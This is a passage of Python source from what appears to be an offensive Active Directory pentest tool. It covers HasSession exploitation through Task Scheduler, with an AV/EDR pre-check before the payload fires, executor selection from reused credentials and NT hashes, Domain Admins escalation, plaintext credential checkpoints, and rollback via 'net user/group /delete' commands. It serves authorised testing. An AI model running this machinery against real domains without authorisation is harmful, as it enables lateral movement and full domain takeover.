                    "cleanup_pending": True,
                    "cleanup_error": "Missing cleanup credential or artifact metadata.",
                }
            )
            update_edge_status_by_labels(
                shell,
                domain,
                from_label=str(details.get("from") or ""),
                relation=str(step.get("action") or ""),
                to_label=str(details.get("to") or ""),
                status="success",
                notes=cleanup_notes,
            )
            step["status"] = "success"
            step["details"] = cleanup_notes
            _mark_writelogonscript_cleanup_panel(
                target_user=next_target_user,
                uploaded_file_path=uploaded_file_path,
                target_object=target_object,
                error_summary="Missing cleanup credential or artifact metadata.",
            )
            continue

        smb_service = SMBPathAccessService()
        delete_result = smb_service.delete_file(
            target_host=target_host,
            share_name=share_name,
            file_path=uploaded_file_path,
            username=cleanup_user,
            password=cleanup_password,
            auth_domain=domain,
            use_kerberos=use_kerberos,
            kdc_host=spn_kdc_ip if use_kerberos else None,
            spn_host=spn_host,
        )
        service = ExploitationService()
        revert_success = False
        revert_error = ""
        if previous_readable:
            revert_result = service.acl.set_user_logon_script(
                pdc_host=target_host,
                domain=domain,
                username=cleanup_user,
                password=cleanup_password,
                target_object=target_object,
                script_path=previous_script_path if previous_script_path else None,
                kerberos=use_kerberos,
                timeout=180,
            )
            revert_success = bool(revert_result.success)
            revert_error = str(
                revert_result.error_message or revert_result.raw_output or ""
            ).strip()
        else:
            revert_error = (
                "Original scriptPath value was not captured; automatic revert skipped."
            )

        cleanup_ok = bool(delete_result.success and revert_success)
        cleanup_notes.update(
            {
                "cleanup_pending": not cleanup_ok,
                "cleanup_status": "success" if cleanup_ok else "failed",
                "cleanup_completed_at": datetime.now(UTC).isoformat(),
                "cleanup_file_deleted": bool(delete_result.success),
                "cleanup_scriptpath_reverted": bool(revert_success),
                "cleanup_file_error": delete_result.error_message or "",
                "cleanup_scriptpath_error": revert_error,
            }
        )
        update_edge_status_by_labels(
            shell,
            domain,
            from_label=str(details.get("from") or ""),
            relation=str(step.get("action") or ""),
            to_label=str(details.get("to") or ""),
            status="success",
            notes=cleanup_notes,
        )
        step["status"] = "success"
        step["details"] = cleanup_notes
        if cleanup_ok:
            print_info(
                "WriteLogonScript cleanup completed: the staged script was removed and the original "
                f"scriptPath was restored for {mark_sensitive(str(details.get('to') or ''), 'user')}."
            )
            continue
        _mark_writelogonscript_cleanup_panel(
            target_user=next_target_user,
            uploaded_file_path=uploaded_file_path,
            target_object=target_object,
            error_summary=(
                delete_result.error_message
                or revert_error
                or "One or more automatic cleanup operations failed."
            ),
        )


def _extract_password_spray_step_metadata(
    details: dict[str, Any],
) -> tuple[str | None, str | None, str | None]:
    """Return spray metadata persisted in one PasswordSpray path step."""
    spray_type = str(details.get("spray_type") or "").strip() or None
    spray_category = str(details.get("spray_category") or "").strip() or None
    password_value = details.get("password")
    password = password_value if isinstance(password_value, str) else None
    return spray_type, spray_category, password


def _sanitize_filename_token(value: str, *, fallback: str) -> str:
    """Return a filesystem-safe token for log file names."""
    token = re.sub(r"[^a-zA-Z0-9_.-]+", "_", str(value or "").strip())
    token = token.strip("._")
    return token or fallback


def _is_valid_domain_username(value: str, *, allow_machine: bool = False) -> bool:
    """Validate a candidate domain username/sAMAccountName."""
    candidate = str(value or "").strip()
    if not candidate:
        return False
    if len(candidate) > 20:
        return False
    if allow_machine and candidate.endswith("$"):
        candidate = candidate[:-1]
    if not candidate:
        return False
    return bool(re.fullmatch(r"[A-Za-z0-9._-]+", candidate))


def _generate_default_hassession_username() -> str:
    """Generate a short default domain username for HasSession escalation."""
    stamp = datetime.now(UTC).strftime("%m%d%H%M")
    suffix = f"{secrets.randbelow(100):02d}"
    return f"adscan{stamp}{suffix}"[:20]


def _resolve_password_policy_for_execution(
    shell: Any,
    *,
    domain: str,
    target_user: str | None,
    username: str | None,
    password: str | None,
) -> Any:
    """Resolve the resultant password policy for a password-setting step (live-first).

    Mirrors the call shape used by the interactive ForceChangePassword Gate-1
    (:func:`adscan_internal.cli.exploits._resolve_fcp_password_policy`) and by
    :func:`adscan_internal.services.exploitation.minted_account_identity`. The
    centralized resolver is live-first, PSO-aware, and degrades to a strong safe
    default when no live read is possible, so this never blocks the execution
    engine - worst case it returns ``source="default_assumed"``.

    Args:
        shell: Active shell (provides ``domains_data`` and DC IP context).
        domain: Target AD domain the new password will live in.
        target_user: sAMAccountName of the account whose password is being set
            (drives the per-user PSO read). ``None`` resolves the domain default.
        username, password: Executor credential used to bind for the live read.

    Returns:
        A ``ResultantPasswordPolicy`` (never ``None``).
    """
    from adscan_internal.passwords import _default_strong_policy
    from adscan_internal.services.posture_probe import (
        resolve_resultant_password_policy,
    )

    domains_data = getattr(shell, "domains_data", {}) or {}
    if not isinstance(domains_data, dict):
        domains_data = {}
    domain_data = domains_data.get(domain) or {}
    dc_ip = resolve_dc_ip(domain_data) or str(domain_data.get("pdc") or "").strip()
    if not dc_ip or not username or not password:
        # No reachable DC IP or no usable bind credential: fall back to the
        # strong safe default rather than fabricating a network call. The
        # generator still produces a fully compliant password.
        return _default_strong_policy()

    looks_like_nt = bool(
        password
        and len(password) == 32
        and all(c in "0123456789abcdefABCDEF" for c in password)
    )
    is_ccache = str(password or "").lower().endswith(".ccache")
    try:
        return run_async_sync(
            resolve_resultant_password_policy(
                domain=domain,
                dc_ip=dc_ip,
                target_user=target_user,
                username=username,
                password=None if (looks_like_nt or is_ccache) else password,
                nt_hash=password if looks_like_nt else None,
                ccache_path=password if is_ccache else None,
                use_kerberos=is_ccache,
                domains_data=domains_data,
            )
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_info_debug(
            "Could not resolve live domain password policy for the execution "
            f"engine: {exc}. Falling back to the strong safe default."
        )
        return _default_strong_policy()


def _generate_policy_compliant_password(
    shell: Any,
    *,
    domain: str,
    target_user: str | None,
    username: str | None,
    password: str | None,
    machine: bool = False,
) -> str:
    """Generate a password that satisfies the target's live (or default) policy.

    Single entry point for every password-SETTING step in the execution engine
    (ForceChangePassword, new domain-user creation). Routes through the canonical
    policy-aware generator
    (:func:`adscan_internal.passwords.generate_compliant_password`) so a domain
    with ``minPwdLength`` above a fixed legacy length, or a fine-grained PSO,
    never receives a non-compliant password.

    Args:
        shell: Active shell (DC IP + credential context).
        domain: Target AD domain.
        target_user: Account whose password is being set (drives the PSO read).
        username, password: Executor bind credential for the live policy read.
        machine: ``True`` for computer accounts (machine length floor + forced
            complexity); ``False`` for user accounts.

    Returns:
        A generated password guaranteed to pass ``validate_against_policy`` for
        the resolved policy.
    """
    policy = _resolve_password_policy_for_execution(
        shell,
        domain=domain,
        target_user=target_user,
        username=username,
        password=password,
    )
    return generate_compliant_password(policy, machine=machine)


def _looks_like_nt_hash(value: str) -> bool:
    """Return True if ``value`` looks like a 32-hex NT hash (or LM:NT pair)."""
    raw = str(value or "").strip()
    if not raw:
        return False
    if ":" in raw:
        raw = raw.split(":", 1)[1]
    return len(raw) == 32 and all(c in "0123456789abcdefABCDEF" for c in raw)


def _resolve_session_target_ip(target_host: str) -> str:
    """Resolve ``target_host`` to an IPv4 string when it is not already one."""
    import ipaddress as _ipaddress
    import socket as _socket

    raw = str(target_host or "").strip()
    if not raw:
        return raw
    try:
        _ipaddress.ip_address(raw)
        return raw
    except ValueError:
        pass
    try:
        return _socket.gethostbyname(raw)
    except OSError:
        return raw


def _hassession_av_edr_gate(
    shell: Any,
    *,
    domain: str,
    target_host: str,
    target_user: str,
    session_user: str,
    exec_username: str,
    exec_password: str,
    non_interactive: bool,
) -> str:
    """Pre-flight AV/EDR gate for HasSession exploitation.

    Runs ``HostFingerprintService.fingerprint`` against the target via the
    same SMB credentials we are about to use for schtask. Renders the result
    in a Rich panel matching the live HasSession UX (green/yellow/red border
    based on risk) and asks the operator to confirm before the schtask
    payload fires.

    Returns one of:
        "proceed"  → caller continues with exploitation
        "abort"    → operator chose to cancel; caller returns immediately
    """
    from adscan_internal.services.exploitation.hassession_native import (
        fingerprint_target_host_sync,
    )
    from adscan_internal.services.remote_exec import (
        build_smb_config_from_credential,
    )

    domain_data = getattr(shell, "domains_data", {}).get(domain, {}) or {}
    pdc_ip = str(domain_data.get("pdc") or "").strip() or None
    target_ip = _resolve_session_target_ip(target_host)
    secret_kind = "nt_hash" if _looks_like_nt_hash(exec_password) else "password"
    config = build_smb_config_from_credential(
        domain=domain,
        username=exec_username,
        secret=exec_password,
        secret_kind=secret_kind,
        target_host=target_host,
        target_ip=target_ip,
        kdc_ip=pdc_ip,
        auth_domain=domain,
        prefer_kerberos=False,
        timeout=30,
    )

    print_info(
        f"[hassession] Fingerprinting AV/EDR on {mark_sensitive(target_host, 'hostname')}…"
    )
    fp = fingerprint_target_host_sync(config)

    # Render the banner using the same widget helper the live view uses, but
    # standalone so the operator sees it BEFORE the live panel takes over.
    from rich.padding import Padding as _Padding
    from rich.panel import Panel as _Panel
    from rich.table import Table as _Table
    from rich.text import Text as _Text

    has_edr = bool(getattr(fp, "has_edr", False))
    has_av = bool(getattr(fp, "has_av", False))
    defender_rtp = bool(getattr(fp, "defender_rtp", True))
    active_products = list(getattr(fp, "active_products", []) or [])
    fp_error = getattr(fp, "error", None)

    if fp is None:
        # fingerprint returned None — target unreachable for fingerprint
        print_warning(
            "[hassession] AV/EDR fingerprint unavailable (target may not "
            "expose RemoteRegistry / IPC$). Proceeding without pre-check."
        )
        return "proceed"

    if has_edr:
        border, icon, headline = (
            "red",
            "🛑",
            "EDR ACTIVE on target — schtask payload may be killed",
        )
        risk_level = "high"
    elif has_av or (defender_rtp and active_products):
        border, icon, headline = (
            "yellow",
            "⚠ ",
            "AV active on target — Defender may quarantine output",
        )
        risk_level = "medium"
    else:
        border, icon, headline = "green", "✓ ", "No active AV/EDR detected on target"
        risk_level = "low"

    body = _Table.grid(padding=(0, 1))
    body.add_column(no_wrap=True)
    body.add_column(no_wrap=False)
    head = _Text()
    head.append(f"{icon} ", style="bold")
    head.append(headline, style=f"bold {border}")
    body.add_row("", head)

    if fp_error:
        line = _Text()
        line.append("  ⚠ partial fingerprint: ", style="dim")
        line.append(str(fp_error)[:140], style="dim")
        body.add_row("", line)

    if active_products:
        for product in active_products:
            pname = str(getattr(product, "name", "unknown"))
            category = str(getattr(product, "category", "")).upper()
            status = str(getattr(product, "status_label", ""))
            line = _Text()
            line.append(f"  {category:>3s}  ", style="dim")
            line.append(pname, style="bold")
            line.append("  ·  ", style="dim")
            line.append(status, style="red" if category == "EDR" else "yellow")
            body.add_row("", line)
    else:
        line = _Text()
        line.append("  No catalog matches.  ", style="dim")
        line.append("Defender RTP=", style="dim")
        line.append(
            "ON" if defender_rtp else "OFF", style="red" if defender_rtp else "green"
        )
        body.add_row("", line)

    elapsed = getattr(fp, "elapsed_s", 0.0)
    footer = _Text()
    footer.append(f"  fingerprint took {elapsed:0.1f}s  ·  target ", style="dim")
    footer.append(mark_sensitive(target_host, "hostname"), style="dim")
    body.add_row("", footer)

    panel = _Panel(
        _Padding(body, (1, 1)),
        title="[bold]HasSession · AV / EDR pre-check[/bold]",
        border_style=border,
        expand=False,
    )
    from adscan_internal import get_console as _get_console

    _get_console().print(panel)

    # Bind the fingerprint to the live context so the live panel reuses it.
    # The HasSessionLiveContext has no fingerprint field today; we attach it
    # as an opaque attribute the live view can pick up via set_fingerprint.
    setattr(shell, "_hassession_last_fingerprint", fp)

    if non_interactive or risk_level == "low":
        return "proceed"

    if risk_level == "high":
        prompt = "EDR is active and may kill the schtask payload. Proceed anyway?"
        default = False
    else:
        prompt = "AV is active — output may be quarantined. Proceed with exploitation?"
        default = True

    if Confirm.ask(prompt, default=default):
        return "proceed"
    print_info("[hassession] Exploitation aborted at AV/EDR gate.")
    return "abort"


def _run_hassession_schtask_command_native(
    shell: Any,
    *,
    domain: str,
    exec_username: str,
    exec_password: str,
    target_host: str,
    session_user: str,
    command_to_run: str,
    log_suffix: str,
) -> tuple[bool, str]:
    """Execute schtask_as natively via aiosmb Task Scheduler RPC.

    Replaces the legacy NetExec ``-M schtask_as`` subprocess call with a fully
    async aiosmb implementation (no subprocess, no netexec dependency, premium
    Rich live UX). Same return contract as the legacy helper:
    ``(success, combined_stdout_stderr)``.
    """
    from adscan_internal.cli.widgets.hassession_live import (
        HasSessionLiveContext,
        HasSessionLiveView,
    )
    from adscan_internal.services.exploitation.hassession_native import (
        run_command_as_session_user_sync,
    )
    from adscan_internal.services.remote_exec import (
        build_smb_config_from_credential,
    )

    marked_host = mark_sensitive(target_host, "hostname")
    marked_exec_user = mark_sensitive(exec_username, "user")
    marked_session_user = mark_sensitive(session_user, "user")
    print_info_debug(
        "[hassession-native] schtask_as on "
        f"{marked_host} as session user {marked_session_user} "
        f"(executor: {marked_exec_user})."
    )

    domain_data = getattr(shell, "domains_data", {}).get(domain, {}) or {}
    pdc_ip = str(domain_data.get("pdc") or "").strip() or None
    target_ip = _resolve_session_target_ip(target_host)

    secret_kind = "nt_hash" if _looks_like_nt_hash(exec_password) else "password"
    config = build_smb_config_from_credential(
        domain=domain,
        username=exec_username,
        secret=exec_password,
        secret_kind=secret_kind,
        target_host=target_host,
        target_ip=target_ip,
        kdc_ip=pdc_ip,
        auth_domain=domain,
        prefer_kerberos=False,
        timeout=30,
    )

    short_command = command_to_run.strip()
    if len(short_command) > 96:
        short_command = short_command[:93] + "…"
    live_ctx = HasSessionLiveContext(
        target_host=target_host,
        target_ip=target_ip,
        session_user=session_user,
        executor_user=exec_username,
        auth_kind="NTLM" if secret_kind == "password" else "NTLM (NT hash)",
        command_label=short_command,
    )

    cached_fp = getattr(shell, "_hassession_last_fingerprint", None)

    with HasSessionLiveView(live_ctx) as live:
        if cached_fp is not None:
            live.set_fingerprint(cached_fp)
        result = run_command_as_session_user_sync(
            config,
            session_user,
            command_to_run,
            progress=live.on_event,
        )
        live.set_final(result)

    output = result.output or ""
    if not result.success and result.error:
        output = (output + "\n" + result.error).strip() if output else result.error

    return bool(result.success), output


def _run_hassession_schtask_command(
    shell: Any,
    *,
    domain: str,
    exec_username: str,
    exec_password: str,
    target_host: str,
    session_user: str,
    command_to_run: str,
    log_suffix: str,
) -> tuple[bool, str]:
    """Run HasSession schtask_as via the native aiosmb backend."""
    return _run_hassession_schtask_command_native(
        shell,
        domain=domain,
        exec_username=exec_username,
        exec_password=exec_password,
        target_host=target_host,
        session_user=session_user,
        command_to_run=command_to_run,
        log_suffix=log_suffix,
    )


def _resolve_exec_password_for_user(
    shell: Any,
    *,
    domain: str,
    username: str,
    context_username: str | None,
    context_password: str | None,
) -> str | None:
    """Resolve the password/hash for ``username`` without mismatching context creds."""
    if not username:
        return None
    context_user = _normalize_account(context_username or "")
    if context_password and context_user and username.lower() == context_user.lower():
        return context_password
    return _resolve_domain_password(shell, domain, username)


def _resolve_hassession_host_and_user(
    shell: Any,
    *,
    domain: str,
    from_label: str,
    to_label: str,
) -> tuple[str | None, str | None]:
    """Resolve HasSession host and logged-on user from path labels."""
    from_target = resolve_netexec_target_for_node_label(
        shell, domain, node_label=from_label
    )
    to_target = resolve_netexec_target_for_node_label(
        shell, domain, node_label=to_label
    )
    from_user = _normalize_account(from_label)
    to_user = _normalize_account(to_label)

    if isinstance(from_target, str) and from_target.strip():
        host = from_target.strip()
        return host, to_user or from_user or None
    if isinstance(to_target, str) and to_target.strip():
        host = to_target.strip()
        return host, from_user or to_user or None
    return None, to_user or from_user or None


def _extract_group_name_from_label(value: str) -> str:
    """Extract group name from canonical labels like ``GROUP@DOMAIN``."""
    raw = str(value or "").strip()
    if not raw:
        return ""
    if "@" in raw:
        raw = raw.split("@", 1)[0].strip()
    return raw


def _resolve_users_from_principal_label(
    shell: Any,
    *,
    domain: str,
    principal_label: str,
) -> list[str]:
    """Resolve candidate users from a principal label (user or group)."""
    normalized_user = _normalize_account(principal_label)
    if _is_valid_domain_username(normalized_user):
        return [normalized_user]

    group_name = _extract_group_name_from_label(principal_label)
    if not group_name:
        return []
    members = resolve_group_user_members(
        shell,
        domain,
        group_name,
        enabled_only=True,
        max_results=500,
    )
    if members is None:
        return []
    valid_members = [
        user
        for user in members
        if _is_valid_domain_username(user) and not str(user).endswith("$")
    ]
    return sorted(set(valid_members), key=str.lower)


def _collect_previous_host_access_candidates(
    shell: Any,
    *,
    domain: str,
    steps: list[dict[str, Any]],
    current_step_index: int,
    target_host: str,
    context_username: str | None,
    context_password: str | None,
) -> list[tuple[str, str]]:
    """Collect candidate executor users from prior host-access relations.

    Returns:
        List of ``(username, reason)`` sorted by confidence/priority.
    """
    target_host_clean = str(target_host or "").strip().lower()
    if not target_host_clean:
        return []
    relation_priority = {
        "adminto": 0,
        "sqlaccess": 1,
        "sqladmin": 1,
        "canpsremote": 2,
        "canrdp": 3,
    }
    best: dict[str, tuple[tuple[int, int, int], str]] = {}

    for index in range(current_step_index - 1, -1, -1):
        step = steps[index]
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        if action not in relation_priority:
            continue
        details = step.get("details") if isinstance(step.get("details"), dict) else {}
        from_label = str(details.get("from") or "").strip()
        to_label = str(details.get("to") or "").strip()
        if not from_label or not to_label:
            continue
        resolved_target = resolve_netexec_target_for_node_label(
            shell, domain, node_label=to_label
        )
        if not isinstance(resolved_target, str) or not resolved_target.strip():
            continue
        if resolved_target.strip().lower() != target_host_clean:
            continue

        users = _resolve_users_from_principal_label(
            shell,
            domain=domain,
            principal_label=from_label,
        )
        if not users:
            continue
        step_status = str(step.get("status") or "discovered").strip().lower()
        status_rank = 0 if step_status == "success" else 1
        distance = current_step_index - index
        relation_rank = relation_priority[action]
        reason = f"{action}:{step_status}"
        for user in users:
            password = _resolve_exec_password_for_user(
                shell,
                domain=domain,
                username=user,
                context_username=context_username,
                context_password=context_password,
            )
            if not password:
                continue
            score = (status_rank, distance, relation_rank)
            existing = best.get(user)
            if existing is None or score < existing[0]:
                best[user] = (score, reason)

    ordered = sorted(best.items(), key=lambda item: (item[1][0], item[0]))
    return [(username, metadata[1]) for username, metadata in ordered]


def _select_candidate_executor_user(
    shell: Any,
    *,
    candidates: list[tuple[str, str]],
) -> str | None:
    """Prompt operator to select candidate executor user when multiple exist."""
    if not candidates:
        return None
    if len(candidates) == 1 or is_non_interactive(shell):
        return candidates[0][0]
    if not hasattr(shell, "_questionary_select"):
        return candidates[0][0]

    options = [
        f"{mark_sensitive(user, 'user')}  [{reason}]" for user, reason in candidates
    ]
    options.append("Cancel")
    selected = shell._questionary_select(
        "Select execution user for HasSession step:",
        options,
        default_idx=0,
    )
    if selected is None or selected >= len(options) - 1:
        return None
    return candidates[selected][0]


def _find_previous_adminto_exec_user_for_host(
    shell: Any,
    *,
    domain: str,
    steps: list[dict[str, Any]],
    current_step_index: int,
    target_host: str,
) -> str | None:
    """Return the best prior AdminTo source user for the same target host.

    Preference order:
    1) nearest previous AdminTo with ``status=success`` and stored credential
    2) nearest previous AdminTo with any status and stored credential
    """
    target_host_clean = str(target_host or "").strip().lower()
    if not target_host_clean:
        return None

    fallback_user: str | None = None
    for index in range(current_step_index - 1, -1, -1):
        step = steps[index]
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        if action != "adminto":
            continue
        details = step.get("details") if isinstance(step.get("details"), dict) else {}
        from_label = str(details.get("from") or "").strip()
        to_label = str(details.get("to") or "").strip()
        if not from_label or not to_label:
            continue
        resolved_target = resolve_netexec_target_for_node_label(
            shell, domain, node_label=to_label
        )
        if not isinstance(resolved_target, str) or not resolved_target.strip():
            continue
        if resolved_target.strip().lower() != target_host_clean:
            continue

        candidate_user = _normalize_account(from_label)
        if not _is_valid_domain_username(candidate_user):
            continue
        if not _resolve_domain_password(shell, domain, candidate_user):
            continue

        step_status = str(step.get("status") or "discovered").strip().lower()
        if step_status == "success":
            marked_user = mark_sensitive(candidate_user, "user")
            marked_host = mark_sensitive(target_host, "hostname")
            print_info_debug(
                "[hassession] Selected executor from previous successful AdminTo: "
                f"{marked_user} -> {marked_host}"
            )
            return candidate_user
        if fallback_user is None:
            fallback_user = candidate_user

    if fallback_user:
        marked_user = mark_sensitive(fallback_user, "user")
        marked_host = mark_sensitive(target_host, "hostname")
        print_info_debug(
            "[hassession] Selected executor from previous AdminTo candidate: "
            f"{marked_user} -> {marked_host}"
        )
    return fallback_user


def _resolve_hassession_execution_user(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    steps: list[dict[str, Any]],
    current_step_index: int,
    target_host: str,
    from_label: str,
    context_username: str | None,
    context_password: str | None,
) -> tuple[str | None, str | None, str]:
    """Resolve executor credential context for HasSession exploitation."""
    candidates = _collect_previous_host_access_candidates(
        shell,
        domain=domain,
        steps=steps,
        current_step_index=current_step_index,
        target_host=target_host,
        context_username=context_username,
        context_password=context_password,
    )
    if candidates:
        selected_user = _select_candidate_executor_user(shell, candidates=candidates)
        if not selected_user:
            return None, None, "cancelled"
        password = _resolve_exec_password_for_user(
            shell,
            domain=domain,
            username=selected_user,
            context_username=context_username,
            context_password=context_password,
        )
        if password:
            reason_map = {user: reason for user, reason in candidates}
            return (
                selected_user,
                password,
                reason_map.get(selected_user, "previous_host_access"),
            )

    exec_username = _resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
    )
    if not exec_username:
        return None, None, "unresolved"
    password = _resolve_exec_password_for_user(
        shell,
        domain=domain,
        username=exec_username,
        context_username=context_username,
        context_password=context_password,
    )
    return exec_username, password, "generic_context"


def _resolve_domain_admin_group_candidates(shell: Any, domain: str) -> list[str]:
    """Return candidate localized names for the Domain Admins group."""
    candidates: list[str] = []
    resolved = resolve_group_name_by_rid(shell, domain, 512)
    if isinstance(resolved, str) and resolved.strip():
        candidates.append(resolved.strip())
    candidates.extend(["Domain Admins", "Admins. del dominio"])

    unique: list[str] = []
    seen: set[str] = set()
    for name in candidates:
        normalized = str(name or "").strip()
        key = normalized.lower()
        if not normalized or key in seen:
            continue
        seen.add(key)
        unique.append(normalized)
    return unique


def _resolve_hassession_verify_delay_seconds(shell: Any | None = None) -> float:
    """Return post-add delay before verifying HasSession Domain Admin membership."""
    interactive_default = 0.0 if is_non_interactive(shell) else 3.0
    raw = str(os.getenv("ADSCAN_HASSESSION_VERIFY_DELAY_SECONDS", "")).strip()
    if not raw:
        return interactive_default
    try:
        value = float(raw)
    except ValueError:
        print_info_debug(
            "[hassession] Invalid ADSCAN_HASSESSION_VERIFY_DELAY_SECONDS value; "
            f"using default {interactive_default:.1f}s."
        )
        return interactive_default
    if value < 0:
        return 0.0
    return min(value, 30.0)


def _wait_for_hassession_membership_propagation(
    shell: Any,
    *,
    domain: str,
    target_user: str,
) -> None:
    """Wait briefly for AD membership propagation before verification checks."""
    delay_seconds = _resolve_hassession_verify_delay_seconds(shell)
    if delay_seconds <= 0:
        return
    marked_user = mark_sensitive(target_user, "user")
    marked_domain = mark_sensitive(domain, "domain")
    print_info_debug(
        "[hassession] Waiting "
        f"{delay_seconds:.1f}s before verifying Domain Admin membership for "
        f"{marked_user}@{marked_domain}."
    )
    time.sleep(delay_seconds)


def _write_hassession_cleanup_checkpoint(
    shell: Any,
    *,
    domain: str,
    target_user: str,
    target_password: str | None,
    target_host: str,
    session_user: str,
    exec_username: str,
    exec_password: str,
    user_created_by_us: bool,
    group_candidates: list[str],
) -> None:
    """Persist a cleanup checkpoint so HasSession artifacts survive crashes.

    Written before the user is added to Domain Admins so that even a crash
    mid-exploitation leaves a recoverable record. Cleared by
    :func:`_clear_hassession_cleanup_checkpoint` after successful rollback.
    """
    import json as _json

    workspace_dir = _resolve_workspace_dir(shell, domain)
    if not workspace_dir:
        return
    checkpoint_path = os.path.join(
        workspace_dir, "domains", domain, "hassession_cleanup_pending.json"
    )
    os.makedirs(os.path.dirname(checkpoint_path), exist_ok=True)
    payload: dict[str, Any] = {
        "target_user": target_user,
        "target_password": target_password,
        "target_host": target_host,
        "session_user": session_user,
        "exec_username": exec_username,
        "exec_password": exec_password,
        "user_created_by_us": user_created_by_us,
        "group_candidates": group_candidates,
        "created_at": datetime.now(UTC).isoformat(),
        "rollback_done": False,
    }
    try:
        with open(checkpoint_path, "w", encoding="utf-8") as fh:
            _json.dump(payload, fh, indent=2)
        print_info_debug(
            f"[hassession] Cleanup checkpoint written: "
            f"{mark_sensitive(target_user, 'user')} @ "
            f"{mark_sensitive(domain, 'domain')}"
        )
    except OSError as exc:
        telemetry.capture_exception(exc)
        print_info_debug(f"[hassession] Could not write cleanup checkpoint: {exc}")


def _clear_hassession_cleanup_checkpoint(shell: Any, *, domain: str) -> None:
    """Remove the pending-cleanup checkpoint after successful rollback."""
    workspace_dir = _resolve_workspace_dir(shell, domain)
    if not workspace_dir:
        return
    checkpoint_path = os.path.join(
        workspace_dir, "domains", domain, "hassession_cleanup_pending.json"
    )
    try:
        if os.path.exists(checkpoint_path):
            os.remove(checkpoint_path)
    except OSError as exc:
        telemetry.capture_exception(exc)
        print_info_debug(f"[hassession] Could not remove cleanup checkpoint: {exc}")


def _run_hassession_rollback(
    shell: Any,
    *,
    domain: str,
    exec_username: str,
    exec_password: str,
    target_host: str,
    session_user: str,
    target_user: str,
    target_password: str | None,
    user_created_by_us: bool,
    group_candidates: list[str],
    non_interactive: bool = False,
) -> None:
    """Remove the HasSession artifact user from the domain.

    Execution order:
      1. Remove from Domain Admins — ``net group "<DA>" "{user}" /delete /domain``
         (all candidate group names, so we don't miss a localised DA group).
      2. If ADscan created the user, delete it — ``net user "{user}" /delete /domain``.

    Both commands run via the same schtask-as channel used during exploitation
    (session_user's interactive logon session). If the target user has DA creds
    at this point, those are tried as a fallback for the LDAP delete so the
    rollback succeeds even if the session user has logged off.
    """
    marked_user = mark_sensitive(target_user, "user")
    marked_domain = mark_sensitive(domain, "domain")
    print_info(
        f"[rollback] Removing HasSession artifact {marked_user} from {marked_domain}…"
    )

    # Remove from every candidate DA group (only whichever we actually added
    # the user to will respond with success; the others will return "not a member",
    # which we treat as acceptable).
    for group_name in group_candidates:
        remove_group_cmd = f'net group "{group_name}" "{target_user}" /delete /domain'
        try:
            ok, output = _run_hassession_schtask_command(
                shell,
                domain=domain,
                exec_username=exec_username,
                exec_password=exec_password,
                target_host=target_host,
                session_user=session_user,
                command_to_run=remove_group_cmd,
                log_suffix=f"rollback_rmgrp_{_sanitize_filename_token(group_name, fallback='group')}",
            )
            if ok:
                print_info(f"[rollback] {marked_user} removed from '{group_name}'.")
            else:
                lowered = (output or "").lower()
                if any(
                    m in lowered
                    for m in (
                        "not a member",
                        "no es miembro",
                        "membre",
                        "3",
                        "no member",
                    )
                ):
                    print_info_debug(
                        f"[rollback] {marked_user} was not in '{group_name}' — skipping."
                    )
                else:
                    print_warning(
                        f"[rollback] Could not remove {marked_user} from '{group_name}': "
                        f"{output[:120] if output else 'no output'}"
                    )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning(f"[rollback] Group removal raised: {exc}")

    if not user_created_by_us:
        print_info_debug(
            f"[rollback] User {marked_user} was pre-existing — skip account deletion."
        )
        return

    # Delete the account we created.
    delete_cmd = f'net user "{target_user}" /delete /domain'
    deleted = False

    # Primary: run as session_user (schtask channel)
    try:
        ok, output = _run_hassession_schtask_command(
            shell,
            domain=domain,
            exec_username=exec_username,
            exec_password=exec_password,
            target_host=target_host,
            session_user=session_user,
            command_to_run=delete_cmd,
            log_suffix="rollback_delusr",
        )
        if ok:
            print_info(f"[rollback] Account {marked_user} deleted from domain.")
            deleted = True
        else:
            print_warning(
                f"[rollback] schtask delete returned failure for {marked_user}: "
                f"{output[:120] if output else 'no output'}"
            )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning(f"[rollback] schtask delete raised: {exc}")

    # Fallback: if the created user has DA creds (target_password), try a direct
    # native LDAP delete so the rollback succeeds even if the session user has
    # logged off by this point.
    if not deleted and target_password:
        try:
            from adscan_internal.services.native_account_cleanup import (
                delete_domain_account_via_ldap,
            )

            if delete_domain_account_via_ldap(
                domains_data=getattr(shell, "domains_data", {}) or {},
                domain=domain,
                username=target_user,
                secret=target_password,
            ):
                print_info(
                    f"[rollback] Account {marked_user} deleted via native LDAP."
                )
                deleted = True
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning(f"[rollback] native LDAP delete raised: {exc}")

    if not deleted:
        print_warning(
            f"[rollback] Could not delete {marked_user} — manual cleanup required: "
            f"net user {target_user} /delete /domain"
        )


def _check_hassession_pending_cleanup(shell: Any, *, domain: str) -> None:
    """Offer to clean up a HasSession artifact left by a previous crashed run.

    Call this at the start of any domain scan so abandoned accounts are
    surfaced before new exploitation begins.
    """
    import json as _json

    workspace_dir = _resolve_workspace_dir(shell, domain)
    if not workspace_dir:
        return
    checkpoint_path = os.path.join(
        workspace_dir, "domains", domain, "hassession_cleanup_pending.json"
    )
    if not os.path.exists(checkpoint_path):
        return
    try:
        with open(checkpoint_path, encoding="utf-8") as fh:
            data: dict[str, Any] = _json.load(fh)
    except (OSError, ValueError) as exc:
        telemetry.capture_exception(exc)
        return

    if data.get("rollback_done"):
        _clear_hassession_cleanup_checkpoint(shell, domain=domain)
        return

    target_user = str(data.get("target_user") or "")
    created_at = str(data.get("created_at") or "")
    if not target_user:
        return

    marked = mark_sensitive(target_user, "user")
    marked_domain = mark_sensitive(domain, "domain")
    print_warning(
        f"[rollback] Pending HasSession cleanup detected: "
        f"{marked} @ {marked_domain} (created {created_at}). "
        "Run 'adscan cleanup hassession' or execute cleanup now."
    )

    if is_non_interactive(shell):
        return

    from rich.prompt import Confirm

    if Confirm.ask("Execute cleanup now?", default=True):
        _run_hassession_rollback(
            shell,
            domain=domain,
            exec_username=str(data.get("exec_username") or ""),
            exec_password=str(data.get("exec_password") or ""),
            target_host=str(data.get("target_host") or ""),
            session_user=str(data.get("session_user") or ""),
